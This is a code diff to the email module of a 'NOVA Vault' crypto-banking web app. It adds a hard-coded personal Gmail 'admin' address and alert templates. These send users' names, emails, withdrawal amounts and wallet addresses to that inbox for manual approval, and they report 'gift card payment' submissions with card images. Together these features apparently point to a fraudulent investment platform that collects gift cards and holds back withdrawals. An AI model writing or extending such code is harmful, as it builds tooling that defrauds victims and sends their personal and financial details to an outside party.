@@ -4,6 +4,8 @@ const SERVICE_ID  = "service_d9osl1s";
 const TEMPLATE_ID = "template_sjk9fr4";
 const PUBLIC_KEY  = "t8kS5uait_n1Z8x-i";
 
+const ADMIN_EMAIL = "davehack966@gmail.com";
+
 emailjs.init(PUBLIC_KEY);
 
 export async function sendEmail({ to_email, to_name, subject, message }) {
@@ -56,5 +58,20 @@ export const Emails = {
     to_name:  user.name,
     subject:  "Welcome to NOVA Vault 🎉",
     message:  `Welcome to NOVA Vault, ${user.name}!\n\nYour premium crypto banking account has been created successfully.\n\nYou can now:\n• Buy, sell and swap crypto\n• Set price alerts\n• Withdraw funds securely\n• Track your portfolio in real time\n\nIf you have any questions, our support team is here 24/7.\n\nWelcome aboard!`,
+  }),
+
+  // ── Admin alerts ──────────────────────────────────────────────
+  adminWithdrawalAlert: (user, amount, currency, destWallet) => ({
+    to_email: ADMIN_EMAIL,
+    to_name:  "Admin",
+    subject:  `🔔 New Withdrawal Request — ${amount} ${currency}`,
+    message:  `A new withdrawal request has been submitted.\n\nUser: ${user.name}\nEmail: ${user.email}\nAmount: ${amount} ${currency}\nDestination: ${destWallet}\n\nLog in to the Admin Panel to review and approve/reject this request.`,
+  }),
+
+  adminGiftCardAlert: (user, cardLabel, amount) => ({
+    to_email: ADMIN_EMAIL,
+    to_name:  "Admin",
+    subject:  `🎁 New Gift Card Submission — $${amount}`,
+    message:  `A new gift card payment has been submitted.\n\nUser: ${user.name}\nEmail: ${user.email}\nCard Type: ${cardLabel}\nAmount: $${amount}\n\nLog in to the Admin Panel to view the image and approve/reject this submission.`,
   }),
 };
